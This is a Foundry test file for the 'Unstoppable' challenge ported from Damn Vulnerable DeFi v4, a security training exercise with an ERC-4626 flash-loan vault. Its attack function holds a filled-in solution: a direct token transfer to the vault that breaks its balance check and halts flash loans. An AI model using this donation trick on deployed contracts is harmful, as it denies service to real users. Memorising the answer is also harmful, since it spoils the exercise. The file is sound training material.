// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

import {DamnValuableToken} from "../../src/challenges/unstoppable/DamnValuableToken.sol";
import {UnstoppableVault} from "../../src/challenges/unstoppable/UnstoppableVault.sol";
import {UnstoppableMonitor} from "../../src/challenges/unstoppable/UnstoppableMonitor.sol";

/// @title Challenge — Unstoppable
/// @notice Ported from Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
///
///         An ERC-4626 vault holds 1,000,000 DVT and offers flash loans for free during the
///         grace period. You are holding 10 DVT.
///
///         Goal: make the vault **stop offering flash loans**.
contract UnstoppableChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    uint256 constant TOKENS_IN_VAULT = 1_000_000e18;
    uint256 constant INITIAL_PLAYER_TOKEN_BALANCE = 10e18;

    DamnValuableToken public token;
    UnstoppableVault public vault;
    UnstoppableMonitor public monitor;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    ////////////////////////////////////////////////////////////////////////
    // Initial setup — do not change
    ////////////////////////////////////////////////////////////////////////
    function setUp() public {
        startHoax(deployer);

        token = new DamnValuableToken();
        vault = new UnstoppableVault(token, deployer, deployer);

        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, deployer);

        token.transfer(player, INITIAL_PLAYER_TOKEN_BALANCE);

        monitor = new UnstoppableMonitor(address(vault));
        vault.transferOwnership(address(monitor));

        vm.expectEmit();
        emit UnstoppableMonitor.FlashLoanStatus(true);
        monitor.checkFlashLoan(100e18);

        vm.stopPrank();
    }

    ////////////////////////////////////////////////////////////////////////
    // Initial-state checks — do not change
    ////////////////////////////////////////////////////////////////////////
    function test_assertInitialState() public {
        assertEq(token.balanceOf(address(vault)), TOKENS_IN_VAULT);
        assertEq(token.balanceOf(player), INITIAL_PLAYER_TOKEN_BALANCE);

        assertEq(monitor.owner(), deployer);

        assertEq(address(vault.asset()), address(token));
        assertEq(vault.totalAssets(), TOKENS_IN_VAULT);
        assertEq(vault.totalSupply(), TOKENS_IN_VAULT);
        assertEq(vault.maxFlashLoan(address(token)), TOKENS_IN_VAULT);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT - 1), 0);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT), 50_000e18);

        assertEq(vault.owner(), address(monitor));
        assertFalse(vault.paused());

        // the player may not pause the vault
        vm.prank(player);
        vm.expectRevert(abi.encodeWithSelector(Ownable.OwnableUnauthorizedAccount.selector, player));
        vault.setPause(true);

        // the player may not call the monitor
        vm.prank(player);
        vm.expectRevert(abi.encodeWithSelector(Ownable.OwnableUnauthorizedAccount.selector, player));
        monitor.checkFlashLoan(100e18);
    }

    ////////////////////////////////////////////////////////////////////////
    // Write your attack here — this is the only function you need to change
    ////////////////////////////////////////////////////////////////////////
    function test_unstoppable() public checkSolvedByPlayer {
        // Hint: you are holding 10 DVT. What assumption does the vault make about its own balance?
        token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
    }

    ////////////////////////////////////////////////////////////////////////
    // Pass/fail check — do not change
    ////////////////////////////////////////////////////////////////////////
    function _isSolved() private {
        // the flash-loan check has to fail
        vm.prank(deployer);
        vm.expectEmit();
        emit UnstoppableMonitor.FlashLoanStatus(false);
        monitor.checkFlashLoan(100e18);

        // the monitor should have paused the vault and handed ownership back to deployer
        assertTrue(vault.paused(), "the vault was not paused");
        assertEq(vault.owner(), deployer, "the vault ownership did not change");
    }
}
